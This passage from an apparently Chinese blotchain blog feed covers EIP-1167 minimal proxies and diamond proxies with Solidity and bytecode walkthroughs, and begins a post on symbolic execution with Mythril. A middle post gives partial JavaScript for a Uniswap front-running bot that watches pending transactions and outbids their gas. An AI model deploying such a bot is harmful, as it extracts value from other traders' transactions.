钻石标准</a>中，放大镜是四个标准的只读函数，用于告诉您菱形提供哪些功能和刻面。</p><p>刻面是一种智能合约，为钻石提供外部功能。</p></blockquote><p>放大函数存在的一个重要原因是因为智能合约上的函数比事件更可靠。这些功能使钻石坚固耐用。这确保了它们的透明度和与软件的互操作性。</p><p>以下是四个标准的只读放大函数：</p><ul><li><code>facetAddresses()</code>返回菱形使用的所有分面地址。</li><li><code>facetAddress(bytes4 _functionSelector)</code>返回实现函数的分面地址。</li><li><code>facetFunctionSelectors(address _facet)</code>返回菱形使用的所有函数，这些函数来自特定刻面。</li><li><code>facets()</code>返回一个数组，该数组由菱形使用的所有分面地址和函数组成。</li></ul><p>放大镜功能可用于许多有用的事情，包括：</p><ol><li>使用分面地址查询 Etherscan 等服务，以检索和显示钻石使用的所有源代码。</li><li>检索钻石的 ABI 信息。</li><li>工具和编程库使用它们来部署菱形。</li><li>工具和编程库使用它们来升级钻石。</li><li>用户界面使用它们来显示有关钻石的信息。</li><li>用户界面使用它们使用户能够显示和调用钻石上的函数。</li><li>测试使用它们来验证是否正确使用了正确的函数和方面。</li></ol><p>放大镜功能使钻石透明。这对于理解、展示和使用钻石提供的功能非常重要。</p><p>它们对于验证钻石使用是否正确而不是错误或恶意使用非常重要。</p><p>它们对于测试以确保菱形包含正确的函数和刻面以及测试使用钻石的代码非常重要。</p><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>1.钻石通过delegatecall调用代理合约中的函数。</p><p>2.钻石通过调用diamondCut函数增加、替换或删除代理合约以及函数。</p><p>3.当钻石发生任何变化时，产生一个DiamondCut事件。</p><h2 id="最小代理"><a href="#最小代理" class="headerlink" title="最小代理"></a>最小代理</h2><p>在开始之前，<strong>EIP 1167 与可升级性无关</strong>，也不试图替换它。</p><p>EIP1167其实有点生涩，因为它是用EVM低级代码编写的。</p><h3 id="为什么是最小代理？"><a href="#为什么是最小代理？" class="headerlink" title="为什么是最小代理？"></a>为什么是最小代理？</h3><p>假设您需要为您的dApp上的每个用户部署一个钱包。或者，您可能需要为平台处理的每个交易操作设置托管。</p><p>这些只是您必须多次部署同一协定的示例。当然，每个合约的初始化数据可能不同，但代码是相同的。</p><p>由于部署大型合约可能非常昂贵，因此有一种聪明的解决方法，通过它，您可以以<em>最低</em>的部署成本部署同一合约数千次：它称为 <a href="https://eips.ethereum.org/EIPS/eip-1167" target="_blank" rel="noopener">EIP 1167</a>，但我们只称其为<strong>最小代理</strong>。</p><h3 id="要解决的问题"><a href="#要解决的问题" class="headerlink" title="要解决的问题"></a>要解决的问题</h3><p>避免重复部署同样的合约代码，取而代之的是只部署一次合约代码，当需要一份拷贝的时候，就只需要部署一个简单的代理合约。代理合约使用<code>delegatecall</code>来调用合约代码，代理合约有自己的地址、存储插槽和以太余额等。主要目的是为了节约Gas。</p><p>EIP-1167标准是为了以不可改变的方式简单而廉价地克隆目标合约的功能，它规定了一个最小的字节码实现，它将所有调用委托给一个已知的固定地址。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>首先，让我们考虑一下最小代理需要做什么：</p><ol><li>接收一些数据</li><li>使用 <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-7.md" target="_blank" rel="noopener">DELEGATECALL</a> 指令将接收到的数据转发到实施协定。</li><li>获取外部调用的结果（即 DELEGATECALL 的结果）</li><li>如果步骤 3 成功，则将外部调用的结果返回给调用方，或者在任何其他情况下还原事务。</li></ol><p>这四个步骤映射到 EVM 指令中：</p><div class="table-container"><table><thead><tr><th>需求</th><th>EVM 指令</th><th>简短解释</th></tr></thead><tbody><tr><td>解析从调用方接收的数据</td><td><a href="https://ethervm.io/#CALLDATACOPY" target="_blank" rel="noopener">CALLDATACOPY</a></td><td>calldata 是在交易中发送到合约的数据，因此我们需要将其复制到内存中，以便以后能够转发它。</td></tr><tr><td>执行对实现协定的委托调用</td><td><a href="https://ethervm.io/#DELEGATECALL" target="_blank" rel="noopener">DELEGATECALL</a></td><td>在这里，我们将获得的调用数据转发到实现合约。</td></tr><tr><td>检索外部调用的结果</td><td><a href="https://ethervm.io/#RETURNDATACOPY" target="_blank" rel="noopener">RETURNDATACOPY</a></td><td>我们将 DELEGATECALL 的返回数据复制到内存中。</td></tr><tr><td>将数据返回给调用方或还原事务</td><td><a href="https://ethervm.io/#JUMPI" target="_blank" rel="noopener">JUMPI</a>, <a href="https://ethervm.io/#RETURN" target="_blank" rel="noopener">RETURN</a>, <a href="https://ethervm.io/#REVERT" target="_blank" rel="noopener">REVERT</a></td><td>根据外部调用的成功/失败状态，我们要么返回数据，要么还原事务。</td></tr></tbody></table></div><p>看上去和我们之前讲到的透明代理以及UUPS的fallback内容很相似，这并不难，理解到这里以及吃透了一半。我们现在只需要解决一些次要的实现细节。</p><h3 id="字节码分析"><a href="#字节码分析" class="headerlink" title="字节码分析"></a>字节码分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe5af43d82803e903d91602b57fd5bf3</span><br></pre></td></tr></table></figure><p>这样一串字节码其实就是EIP1167的核心内容甚至可以说是全部内容。</p><p>其中<code>bebebebebebebebebebebebebebebebebebebebe</code>是目标合约的地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>    <span class="number">36</span>  CALLDATASIZEcSize</span><br><span class="line"><span class="number">0001</span>    <span class="number">3</span>D  RETURNDATASIZEcSize <span class="number">0</span></span><br><span class="line"><span class="number">0002</span>    <span class="number">3</span>D  RETURNDATASIZEcSize <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0003</span>    <span class="number">37</span>  CALLDATACOPY</span><br><span class="line"><span class="number">0004</span>    <span class="number">3</span>D  RETURNDATASIZE<span class="number">0</span></span><br><span class="line"><span class="number">0005</span>    <span class="number">3</span>D  RETURNDATASIZE<span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0006</span>    <span class="number">3</span>D  RETURNDATASIZE<span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0007</span>    <span class="number">36</span>  CALLDATASIZE<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> cSize</span><br><span class="line"><span class="number">0008</span>    <span class="number">3</span>D  RETURNDATASIZE<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> cSize <span class="number">0</span></span><br><span class="line"><span class="number">0009</span>    <span class="number">73</span>  PUSH20 <span class="number">0xbebebebebebebebebebebebebebebebebebebebe</span><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> cSize <span class="number">0</span> addr</span><br><span class="line"><span class="number">001</span>E    <span class="number">5</span>A  GAS<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> cSize <span class="number">0</span> addr gas</span><br><span class="line"><span class="number">001</span>F    F4  DELEGATECALL<span class="number">0</span> success</span><br><span class="line"><span class="number">0020</span>    <span class="number">3</span>D  RETURNDATASIZE<span class="number">0</span> success rSize</span><br><span class="line"><span class="number">0021</span>    <span class="number">82</span>  DUP3<span class="number">0</span> success rSize <span class="number">0</span></span><br><span class="line"><span class="number">0022</span>    <span class="number">80</span>  DUP1<span class="number">0</span> success rSize <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0023</span>    <span class="number">3</span>E  RETURNDATACOPY<span class="number">0</span> success</span><br><span class="line"><span class="number">0024</span>    <span class="number">90</span>  SWAP1success <span class="number">0</span></span><br><span class="line"><span class="number">0025</span>    <span class="number">3</span>D  RETURNDATASIZEsuccess <span class="number">0</span> rSize</span><br><span class="line"><span class="number">0026</span>    <span class="number">91</span>  SWAP2rSize <span class="number">0</span> success</span><br><span class="line"><span class="number">0027</span>    <span class="number">60</span>  PUSH1 <span class="number">0x2b</span>rSize <span class="number">0</span> success <span class="number">0x2b</span></span><br><span class="line"><span class="number">0029</span>    <span class="number">57</span>  *JUMPI</span><br><span class="line"><span class="number">002</span>A    FD  *REVERT</span><br><span class="line"><span class="number">002</span>B    <span class="number">5</span>B  JUMPDESTrSize <span class="number">0</span></span><br><span class="line"><span class="number">002</span>C    F3  *RETURN</span><br><span class="line">=&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy</span>(<span class="params">address addr</span>) </span>&#123;</span><br><span class="line">assembly&#123;</span><br><span class="line"><span class="keyword">let</span> cSize := calldatasize()</span><br><span class="line">calldatacopy(<span class="number">0</span>,<span class="number">0</span>,cSize) <span class="comment">// 此时MEM[0:0+cSize] = input data,即把函数选择器连同参数一起存放在内存0x00位置处</span></span><br><span class="line"><span class="keyword">let</span> gas := gas()</span><br><span class="line"><span class="keyword">let</span> success := delegatecall(gas, addr, <span class="number">0</span>, cSize, <span class="number">0</span>, <span class="number">0</span>) <span class="comment">//此时调用了addr地址处的代码，方法参数为我方合约内存MEM[0:0+cSize]</span></span><br><span class="line">returndatacopy(<span class="number">0</span>,<span class="number">0</span>,returndatasize()) <span class="comment">//拷贝返回值到内存中MEM[0:rSize]</span></span><br><span class="line"><span class="keyword">if</span> (success) &#123;</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>, rSize) <span class="comment">//将存放在内存中的返回值返回回去</span></span><br><span class="line">&#125;</span><br><span class="line">revert(<span class="number">0</span>, rSize)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：为了尽可能减少gas成本，上述字节码依赖于EIP-211规范，即<code>returndatasize</code>在调用帧内的任何调用之前返回0。 <code>returndatasize</code>比<code>dup</code>*少用1 gas。</p><p>可以将<code>returndatasize</code>换成更好理解的<code>push1 0x00</code>,更好理解</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>我们需要以下合约:</p><ul><li>实现：这是我们的逻辑所在的地方，我们将其称为Implementation.sol。</li><li>CloneFactory：这将是我们的工厂，我们将有一个clone() 函数，用户将触发该函数，工厂将输出代理的地址。工厂的名称将是CloneFactory.sol。</li><li>代理：与代理无关，代理将是CloneFactory.sol 中的clone() 函数的输出。可以有尽可能多的不同代理，这就是整个目的，以创建许多Implementation.sol的克隆。</li></ul><h4 id="逻辑合约-2"><a href="#逻辑合约-2" class="headerlink" title="逻辑合约"></a>逻辑合约</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.8</span><span class="number">.0</span> &lt; <span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Implementation &#123;</span><br><span class="line">    uint public x;</span><br><span class="line">    bool public isBase;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner,<span class="string">"ERROR: Only Owner"</span>);</span><br><span class="line"></span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 逻辑合约的构造函数应该是无参的</span></span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        isBase = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一旦创建代理克隆，需要立即调用 initialize 函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">initialize</span>(<span class="params">address _owner</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 保证该合约只用于逻辑，不会被初始化（代理或者克隆合约不知道构造函数）</span></span><br><span class="line">        <span class="built_in">require</span>(isBase == <span class="literal">false</span>,<span class="string">"ERROR: This the base contract, cannot initialize"</span>);</span><br><span class="line">        <span class="comment">// 确保 initialize 函数只被调用一次</span></span><br><span class="line">        <span class="built_in">require</span>(owner == address(<span class="number">0</span>),<span class="string">"ERROR: Contract already initialized"</span>);</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setX</span>(<span class="params">uint _newX</span>) <span class="title">external</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">        x = _newX;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SOLIDITY</span><br></pre></td></tr></table></figure><h4 id="CloneFactory"><a href="#CloneFactory" class="headerlink" title="CloneFactory"></a>CloneFactory</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.8</span><span class="number">.0</span> &lt; <span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface Implementation &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">initialize</span>(<span class="params">address _owner</span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">CloneFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 逻辑合约的地址</span></span><br><span class="line">    address public implementation;</span><br><span class="line">    <span class="comment">// 跟踪所有已部署克隆的映射</span></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> address[]) public allClones;</span><br><span class="line">    event NewClone(address _newClone, address _owner);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(address _imlementation) &#123;</span><br><span class="line">        implementation = _imlementation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 来自 Open Zeppelin，用于动态创建代理合约并返回新合约的地址</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">address _imlementation</span>) <span class="title">internal</span> <span class="title">returns</span> (<span class="params">address instance</span>) </span>&#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="keyword">let</span> ptr := mload(<span class="number">0x40</span>)</span><br><span class="line">            mstore(ptr, <span class="number">0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000</span>)<span class="comment">//32 bytes</span></span><br><span class="line">            mstore(add(ptr, <span class="number">0x14</span>), shl(<span class="number">0x60</span>, _imlementation)) <span class="comment">//20bytes</span></span><br><span class="line">            mstore(add(ptr, <span class="number">0x28</span>), <span class="number">0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000</span>)<span class="comment">//32 bytes</span></span><br><span class="line">            instance := create(<span class="number">0</span>, ptr, <span class="number">0x37</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">require</span>(instance != address(<span class="number">0</span>),<span class="string">"ERC1167: create failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这是用户需要调用的函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_clone</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        address identicalChild = clone(implementation);</span><br><span class="line">        allClones[msg.sender].push(identicalChild);</span><br><span class="line">        <span class="comment">// 这将使 _clone() 函数的调用者成为克隆合约的所有者。</span></span><br><span class="line">        Implementation(identicalChild).initialize(msg.sender);</span><br><span class="line">        emit NewClone(identicalChild,msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">returnClones</span>(<span class="params">address _owner</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address[] memory</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> allClones[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>如果要从 Solidity 合约部署 EIP 1167 最小代理，可以使用 <code>OpenZeppelin</code> 合约中的<a href="https://docs.openzeppelin.com/contracts/api/proxy#Clones" target="_blank" rel="noopener"><code>克隆</code></a>库。</p><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>虽然通过<code>delegatecall</code>的方式将外部对代理合约的调用全部转接到远程合约上，省去了部署一次合约的开销，但是它存在以下问题：</p><ul><li>代理合约只拷贝了远程合约的runtime code，由于涉及初始化部分的代码在init code中，故代理合约无法拷贝远程合约的构造函数内的内容，需要一个额外的initialize 函数来初始化代理合约的状态值。</li><li><code>delegatecall</code>只能调用public 或者 external的方法，对于其internal 和 private 方法无法调用。所以代理合约相当于只拷贝了远程合约的公开的方法。</li></ul><p>您可能听说过<a href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7" target="_blank" rel="noopener">parity multisig wallet hack</a>。有多个代理（不是 EIP1167）引用相同的实现。但是，钱包具有自毁功能，可以清空合约的存储空间和代码。不幸的是，Parity 钱包的访问控制存在一个错误，有人意外获得了原始实现的所有权。那并没有直接从其他平价钱包中窃取资产，但随后黑客删除了原始实现，使所有剩余的钱包成为没有功能的外壳，并将资产永久锁定在其中。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抢跑机器人实现</title>
      <link href="/frontRunningBot/"/>
      <url>/frontRunningBot/</url>
      
        <content type="html"><![CDATA[<hr><pre><code>author：Thomas_Xu</code></pre><h1 id="抢跑机器人实现"><a href="#抢跑机器人实现" class="headerlink" title="抢跑机器人实现"></a>抢跑机器人实现</h1><p>在阅读本文前，请确保你了解区块链抢跑交易的原理和链上监听相关知识。</p><p><a href="https://thomasxu-blockchain.github.io/Front-Running/">Front-Running - Thomas_Xu (thomasxu-blockchain.github.io)</a></p><p><a href="https://thomasxu-blockchain.github.io/eventListen/">合约事件的监听 - Thomas_Xu (thomasxu-blockchain.github.io)</a></p><p>源码：</p><p><a href="https://github.com/ThomasXu-blockchain/FrontrunningBot" target="_blank" rel="noopener">ThomasXu-blockchain/FrontrunningBot (github.com)</a></p><blockquote><p>申明：此代码不做任何商业用途，不作为攻击手段，只作为个人练手使用。</p></blockquote><h2 id="实现原理："><a href="#实现原理：" class="headerlink" title="实现原理："></a>实现原理：</h2><h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 获得交易以前的代币余额</span></span><br><span class="line">  <span class="keyword">let</span> tokenBalanceBefore = <span class="keyword">await</span> getTokenBalance(TUSD_TOKEN_ADDRESS);</span><br><span class="line">  <span class="comment">// 监控待处理交易</span></span><br><span class="line">  <span class="keyword">const</span> web3Ws = <span class="keyword">new</span> Web3(<span class="keyword">new</span> Web3.providers.WebsocketProvider(<span class="string">`wss://<span class="subst">$&#123;NETWORK&#125;</span>.g.alchemy.com/v2/<span class="subst">$&#123;PROJECT_ID&#125;</span>`</span>));</span><br><span class="line">  subscription = web3Ws.eth.subscribe(<span class="string">'pendingTransactions'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">error, result</span>) </span>&#123;</span><br><span class="line">  &#125;).on(<span class="string">"data"</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params">transactionHash</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> transaction = <span class="keyword">await</span> web3.eth.getTransaction(transactionHash);</span><br><span class="line">    <span class="comment">// 过滤和进行抢跑</span></span><br><span class="line">    <span class="keyword">await</span> handleTransaction(transaction);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (succeed) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'\n'</span> + <span class="string">"Front-running attack succeed."</span>);</span><br><span class="line">      <span class="comment">// 出售 token</span></span><br><span class="line">      <span class="keyword">let</span> tokenBalanceAfter = <span class="keyword">await</span> getTokenBalance(TUSD_TOKEN_ADDRESS);</span><br><span class="line">      <span class="keyword">let</span> srcAmount = (tokenBalanceAfter - tokenBalanceBefore) / (<span class="number">10</span> ** TUSD_DECIMALS);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"Get "</span> + srcAmount + <span class="string">" Tokens."</span> + <span class="string">'\n'</span>);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"Begin selling the tokens."</span>);</span><br><span class="line">      <span class="keyword">await</span> performTrade(TUSD_TOKEN_ADDRESS, ETH_TOKEN_ADDRESS, srcAmount);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"End."</span>)</span><br><span class="line">      process.exit();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这里最主要的就是<code>web3Ws.eth.subscribe</code>这个订阅事件的方法，这可以帮助我们获取到链上所有正在等待打包的交易信息，在得到交易哈希后使用<code>getTransaction</code>即可获得交易元数据。</p><p>之后进入<code>handleTransaction</code>函数进行交易过滤和抢跑，抢跑完成后出售token即可。</p><h3 id="handleTransaction（）"><a href="#handleTransaction（）" class="headerlink" title="handleTransaction（）"></a>handleTransaction（）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">handleTransaction</span>(<span class="params">transaction</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 选出对应的交易</span></span><br><span class="line">  <span class="keyword">if</span> (transaction.to == UNISWAP_ROUTER_ADDRESS &amp;&amp; <span class="keyword">await</span> isPending(transaction.hash)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Found pending uniswap network transaction"</span>, transaction);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 计算gas</span></span><br><span class="line">  <span class="keyword">let</span> gasPrice = <span class="built_in">parseInt</span>(transaction[<span class="string">'gasPrice'</span>]);</span><br><span class="line">  <span class="keyword">let</span> newGasPrice = gasPrice + ONE_GWEI;</span><br><span class="line">  <span class="keyword">if</span> (newGasPrice &gt; MAX_GAS_PRICE) &#123;</span><br><span class="line">    newGasPrice = MAX_GAS_PRICE;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断符合触发抢跑交易的条件后，再进行抢跑</span></span><br><span class="line">  <span class="keyword">if</span> (triggersFrontRun(transaction)) &#123;</span><br><span class="line">    <span class="comment">//取消注册</span></span><br><span class="line">    subscription.unsubscribe();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Perform front running attack...'</span>);</span><br><span class="line">    <span class="comment">//执行抢跑交易</span></span><br><span class="line">    <span class="keyword">await</span> performTrade(ETH_TOKEN_ADDRESS, TUSD_TOKEN_ADDRESS, ETH_QTY, newGasPrice);</span><br><span class="line">    <span class="comment">// 等待抢跑交易成功，并更改状态</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"wait until the honest transaction is done..."</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">await</span> isPending(transaction.hash)) &#123; &#125;</span><br><span class="line">    succeed = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里主要是筛选出router的交易，然后得到该交易的gas，并提高gas以备抢跑。</p><p>在<code>triggersFrontRun</code>里会检查是否是<code>swapExactETHForTokens</code>函数交易，之后就进入抢跑交易。</p><p>如何进行交易参考uniswap的sdk文档<a href="https://docs.uniswap.org/sdk/v2/guides/trading" target="_blank" rel="noopener">Trading | Uniswap</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在交易市场中，套利机器人是随时存在的，这对于维币对稳定有好处。</p><p>在实现中，最大的难点其实是和uniswap的sdk交互的地方，比较繁琐。因为只是一个简单实现，不考虑其他任何因素。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>符号执行以及Mythril工具</title>
      <link href="/Symbol-execution/"/>
      <url>/Symbol-execution/</url>
      
        <content type="html"><![CDATA[<hr><pre><code>author：Thomas_Xu</code></pre><h1 id="符号执行以及Mythril工具"><a href="#符号执行以及Mythril工具" class="headerlink" title="符号执行以及Mythril工具"></a>符号执行以及Mythril工具</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>符号执行是一种程序静态分析的技术，被认为非常有前途。近年利用符号执行进行分析的论文在安全的顶会中出现也较为频繁，还是非常值得去学习的。</p><p>那么今天先从静态分析说起：</p><p><strong>程序静态分析（Program Static Analysis）</strong>是指在不运行代码的方式下，通过词法分析、语法分析、控制流、数据流分析等技术对程序代码进行扫描，验证代码是否满足规范性、安全性、可靠性、可维护性等指标的一种代码分析技术。 程序静态分析的历史几乎与程序的历史一样长, 自从有了程序就有了程序分析。特别是随着编译技术的发展，大大带动了程序的自动分析技术。目前静态分析技术向模拟执行的技术发展以能够发现更多传统意义上动态测试才能发现的缺陷，例如符号执行、抽象解释、值依赖分析等等并采用数学约束求解工具进行路径约减或者可达性分析以发现更多的问题、减少误报、提高效率。</p><h2 id="经典的符号执行技术"><a href="#经典的符号执行技术" class="headerlink" title="经典的符号执行技术"></a>经典的符号执行技术</h2><p>符号执行被看作是最有前途的静态分析技术之一，它可以通过分析技术得到让特定区域执行的输入。最初在1976年由King JC在ACM上提出。即通过使用抽象的符号代替具体值来模拟程序的执行，当遇到分支语句时，它会探索每一个分支, 